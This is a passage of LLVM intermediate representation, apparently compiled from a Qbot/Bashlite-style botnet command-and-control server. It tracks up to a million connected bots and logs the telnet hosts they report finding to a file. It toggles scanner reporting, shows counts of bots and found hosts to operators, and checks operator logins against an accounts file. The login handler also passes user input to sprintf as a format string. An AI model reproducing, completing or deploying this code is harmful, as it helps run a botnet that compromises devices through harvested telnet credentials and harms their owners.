  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 2
  store i8 0, i8* %68, align 1
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %240

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %132

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %124
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %131

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i64 0, i64 0))
  br label %131

103:                                              ; preds = %88
  %104 = load i32, i32* %10, align 4
  %105 = call i32 @make_socket_non_blocking(i32 %104)
  store i32 %105, i32* %5, align 4
  %106 = load i32, i32* %5, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %111

108:                                              ; preds = %103
  %109 = load i32, i32* %10, align 4
  %110 = call i32 @close(i32 %109)
  br label %131

111:                                              ; preds = %103
  %112 = load i32, i32* %10, align 4
  %113 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %114 = bitcast %union.epoll_data* %113 to i32*
  store i32 %112, i32* %114, align 1
  %115 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %115, align 1
  %116 = load volatile i32, i32* @epollFD, align 4
  %117 = load i32, i32* %10, align 4
  %118 = call i32 @epoll_ctl(i32 %116, i32 1, i32 %117, %struct.epoll_event* %3) #9
  store i32 %118, i32* %5, align 4
  %119 = load i32, i32* %5, align 4
  %120 = icmp eq i32 %119, -1
  br i1 %120, label %121, label %124

121:                                              ; preds = %111
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.20, i64 0, i64 0))
  %122 = load i32, i32* %10, align 4
  %123 = call i32 @close(i32 %122)
  br label %131

124:                                              ; preds = %111
  %125 = load i32, i32* %10, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %127, i32 0, i32 2
  store i8 1, i8* %128, align 1
  %129 = load i32, i32* %10, align 4
  %130 = call i64 @send(i32 %129, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i64 0, i64 0), i64 14, i32 16384)
  br label %88

131:                                              ; preds = %121, %108, %102, %101
  br label %240

132:                                              ; preds = %77
  %133 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %134 = load i32, i32* %7, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %133, i64 %135
  %137 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %136, i32 0, i32 1
  %138 = bitcast %union.epoll_data* %137 to i32*
  %139 = load i32, i32* %138, align 1
  store i32 %139, i32* %12, align 4
  %140 = load i32, i32* %12, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %141
  store %struct.clientdata_t* %142, %struct.clientdata_t** %13, align 8
  store i32 0, i32* %14, align 4
  %143 = load %struct.clientdata_t*, %struct.clientdata_t** %13, align 8
  %144 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %143, i32 0, i32 2
  store i8 1, i8* %144, align 1
  br label %145

145:                                              ; preds = %132, %228
  %146 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %146, i8 0, i64 2048, i1 false)
  br label %147

147:                                              ; preds = %211, %210, %203, %195, %179, %173, %145
  %148 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %148, i8 0, i64 2048, i1 false)
  %149 = icmp ne i8* %148, null
  br i1 %149, label %150, label %156

150:                                              ; preds = %147
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %152 = load i32, i32* %12, align 4
  %153 = call i32 @fdgets(i8* %151, i32 2048, i32 %152)
  %154 = sext i32 %153 to i64
  store i64 %154, i64* %16, align 8
  %155 = icmp sgt i64 %154, 0
  br label %156

156:                                              ; preds = %150, %147
  %157 = phi i1 [ false, %147 ], [ %155, %150 ]
  br i1 %157, label %158, label %214

158:                                              ; preds = %156
  %159 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %160 = call i8* @strstr(i8* %159, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i64 0, i64 0)) #8
  %161 = icmp eq i8* %160, null
  br i1 %161, label %162, label %163

162:                                              ; preds = %158
  store i32 1, i32* %14, align 4
  br label %214

163:                                              ; preds = %158
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %164)
  %165 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i64 0, i64 0)) #8
  %167 = icmp eq i32 %166, 0
  br i1 %167, label %168, label %174

168:                                              ; preds = %163
  %169 = load i32, i32* %12, align 4
  %170 = call i64 @send(i32 %169, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i64 0, i64 0), i64 5, i32 16384)
  %171 = icmp eq i64 %170, -1
  br i1 %171, label %172, label %173

172:                                              ; preds = %168
  store i32 1, i32* %14, align 4
  br label %214

173:                                              ; preds = %168
  br label %147, !llvm.loop !12

174:                                              ; preds = %163
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %176 = call i8* @strstr(i8* %175, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0)) #8
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %178 = icmp eq i8* %176, %177
  br i1 %178, label %179, label %190

179:                                              ; preds = %174
  %180 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %181 = call i8* @strstr(i8* %180, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i64 0, i64 0)) #8
  %182 = getelementptr inbounds i8, i8* %181, i64 7
  store i8* %182, i8** %18, align 8
  %183 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %184 = load i8*, i8** %18, align 8
  %185 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %183, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.24, i64 0, i64 0), i8* %184)
  %186 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %187 = call i32 @fflush(%struct._IO_FILE* %186)
  %188 = load volatile i32, i32* @TELFound, align 4
  %189 = add nsw i32 %188, 1
  store volatile i32 %189, i32* @TELFound, align 4
  br label %147, !llvm.loop !12

190:                                              ; preds = %174
  %191 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %192 = call i8* @strstr(i8* %191, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.25, i64 0, i64 0)) #8
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %194 = icmp eq i8* %192, %193
  br i1 %194, label %195, label %198

195:                                              ; preds = %190
  %196 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.25, i64 0, i64 0)) #8
  store i8* %197, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %147, !llvm.loop !12

198:                                              ; preds = %190
  %199 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %200 = call i8* @strstr(i8* %199, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.26, i64 0, i64 0)) #8
  %201 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %202 = icmp eq i8* %200, %201
  br i1 %202, label %203, label %206

203:                                              ; preds = %198
  %204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %205 = call i8* @strstr(i8* %204, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.26, i64 0, i64 0)) #8
  store i8* %205, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %147, !llvm.loop !12

206:                                              ; preds = %198
  %207 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %208 = call i32 @strcmp(i8* %207, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.27, i64 0, i64 0)) #8
  %209 = icmp eq i32 %208, 0
  br i1 %209, label %210, label %211

210:                                              ; preds = %206
  br label %147, !llvm.loop !12

211:                                              ; preds = %206
  %212 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %213 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.28, i64 0, i64 0), i8* %212)
  br label %147, !llvm.loop !12

214:                                              ; preds = %172, %162, %156
  %215 = load i64, i64* %16, align 8
  %216 = icmp eq i64 %215, -1
  br i1 %216, label %217, label %223

217:                                              ; preds = %214
  %218 = call i32* @__errno_location() #10
  %219 = load i32, i32* %218, align 4
  %220 = icmp ne i32 %219, 11
  br i1 %220, label %221, label %222

221:                                              ; preds = %217
  store i32 1, i32* %14, align 4
  br label %222

222:                                              ; preds = %221, %217
  br label %229

223:                                              ; preds = %214
  %224 = load i64, i64* %16, align 8
  %225 = icmp eq i64 %224, 0
  br i1 %225, label %226, label %227

226:                                              ; preds = %223
  store i32 1, i32* %14, align 4
  br label %229

227:                                              ; preds = %223
  br label %228

228:                                              ; preds = %227
  br label %145

229:                                              ; preds = %226, %222
  %230 = load i32, i32* %14, align 4
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %232, label %237

232:                                              ; preds = %229
  %233 = load %struct.clientdata_t*, %struct.clientdata_t** %13, align 8
  %234 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %233, i32 0, i32 2
  store i8 0, i8* %234, align 1
  %235 = load i32, i32* %12, align 4
  %236 = call i32 @close(i32 %235)
  br label %237

237:                                              ; preds = %232, %229
  br label %238

238:                                              ; preds = %237
  br label %239

239:                                              ; preds = %238
  br label %240

240:                                              ; preds = %239, %131, %58
  %241 = load i32, i32* %7, align 4
  %242 = add nsw i32 %241, 1
  store i32 %242, i32* %7, align 4
  br label %27, !llvm.loop !13

243:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.117, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.117, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 2
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !14

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @titleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %21
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @clientsConnected()
  %11 = load volatile i32, i32* @TELFound, align 4
  %12 = load volatile i32, i32* @managesConnected, align 4
  %13 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.29, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 %12, i32 7) #9
  %14 = load i32, i32* %3, align 4
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %17 = call i64 @strlen(i8* %16) #8
  %18 = call i64 @send(i32 %14, i8* %15, i64 %17, i32 16384)
  %19 = icmp eq i64 %18, -1
  br i1 %19, label %20, label %21

20:                                               ; preds = %7
  ret i8* null

21:                                               ; preds = %7
  %22 = call i32 @sleep(i32 2)
  br label %7
}

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Search_in_File(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !15

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca [80 x i8], align 16
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  %8 = alloca [2048 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [2048 x i8], align 16
  %14 = alloca %struct._IO_FILE*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [5000 x i8], align 16
  %27 = alloca [5000 x i8], align 16
  %28 = alloca [1024 x i8*], align 16
  %29 = alloca [1024 x i8*], align 16
  %30 = alloca %struct._IO_FILE*, align 8
  %31 = alloca %struct._IO_FILE*, align 8
  %32 = alloca %struct._IO_FILE*, align 8
  %33 = alloca [1024 x i8*], align 16
  %34 = alloca %struct._IO_FILE*, align 8
  store i8* %0, i8** %3, align 8
  %35 = load i8*, i8** %3, align 8
  %36 = ptrtoint i8* %35 to i32
  store i32 %36, i32* %5, align 4
  %37 = load volatile i32, i32* @managesConnected, align 4
  %38 = add nsw i32 %37, 1
  store volatile i32 %38, i32* @managesConnected, align 4
  %39 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %39, i8 0, i64 2048, i1 false)
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 2048, i1 false)
  %41 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %41, i8 0, i64 2048, i1 false)
  store i32 0, i32* %15, align 4
  %42 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %42, %struct._IO_FILE** %14, align 8
  br label %43

43:                                               ; preds = %48, %1
  %44 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %45 = call i32 @feof(%struct._IO_FILE* %44) #9
  %46 = icmp ne i32 %45, 0
  %47 = xor i1 %46, true
  br i1 %47, label %48, label %53

48:                                               ; preds = %43
  %49 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %50 = call i32 @fgetc(%struct._IO_FILE* %49)
  store i32 %50, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %15, align 4
  br label %43, !llvm.loop !16

53:                                               ; preds = %43
  store i32 0, i32* %17, align 4
  %54 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  call void @rewind(%struct._IO_FILE* %54)
  br label %55

55:                                               ; preds = %60, %53
  %56 = load i32, i32* %17, align 4
  %57 = load i32, i32* %15, align 4
  %58 = sub nsw i32 %57, 1
  %59 = icmp ne i32 %56, %58
  br i1 %59, label %60, label %75

60:                                               ; preds = %55
  %61 = load %struct._IO_FILE*, %struct._IO_FILE** %14, align 8
  %62 = load i32, i32* %17, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %63
  %65 = getelementptr inbounds %struct.account, %struct.account* %64, i32 0, i32 0
  %66 = getelementptr inbounds [20 x i8], [20 x i8]* %65, i64 0, i64 0
  %67 = load i32, i32* %17, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %68
  %70 = getelementptr inbounds %struct.account, %struct.account* %69, i32 0, i32 1
  %71 = getelementptr inbounds [20 x i8], [20 x i8]* %70, i64 0, i64 0
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %61, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.32, i64 0, i64 0), i8* %66, i8* %71)
  %73 = load i32, i32* %17, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %17, align 4
  br label %55, !llvm.loop !17

75:                                               ; preds = %55
  %76 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %77 = call i32 @rand() #9
  %78 = srem i32 %77, 6
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %79
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 (i8*, i8*, ...) @sprintf(i8* %76, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.33, i64 0, i64 0), i8* %81) #9
  %83 = load i32, i32* %5, align 4
  %84 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %85 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = icmp eq i64 %87, -1
  br i1 %88, label %89, label %90

89:                                               ; preds = %75
  br label %910

90:                                               ; preds = %75
  %91 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %92 = load i32, i32* %5, align 4
  %93 = call i32 @fdgets(i8* %91, i32 2048, i32 %92)
  %94 = icmp slt i32 %93, 1
  br i1 %94, label %95, label %96

95:                                               ; preds = %90
  br label %910

96:                                               ; preds = %90
  %97 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %97)
  %98 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %99 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %100 = call i32 (i8*, i8*, ...) @sprintf(i8* %98, i8* %99) #9
  %101 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  store i8* %101, i8** %10, align 8
  %102 = load i8*, i8** %10, align 8
  %103 = call i32 @Search_in_File(i8* %102)
  store i32 %103, i32* %6, align 4
  %104 = load i8*, i8** %10, align 8
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %106
  %108 = getelementptr inbounds %struct.account, %struct.account* %107, i32 0, i32 0
  %109 = getelementptr inbounds [20 x i8], [20 x i8]* %108, i64 0, i64 0
  %110 = call i32 @strcmp(i8* %104, i8* %109) #8
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %146

112:                                              ; preds = %96
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %114 = call i32 @rand() #9
  %115 = srem i32 %114, 6
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [6 x i8*], [6 x i8*]* @colorCodes, i64 0, i64 %116
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 (i8*, i8*, ...) @sprintf(i8* %113, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.35, i64 0, i64 0), i8* %118) #9
  %120 = load i32, i32* %5, align 4
  %121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %122 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %123 = call i64 @strlen(i8* %122) #8
  %124 = call i64 @send(i32 %120, i8* %121, i64 %123, i32 16384)
  %125 = icmp eq i64 %124, -1
  br i1 %125, label %126, label %127

126:                                              ; preds = %112
  br label %910

127:                                              ; preds = %112
  %128 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %129 = load i32, i32* %5, align 4
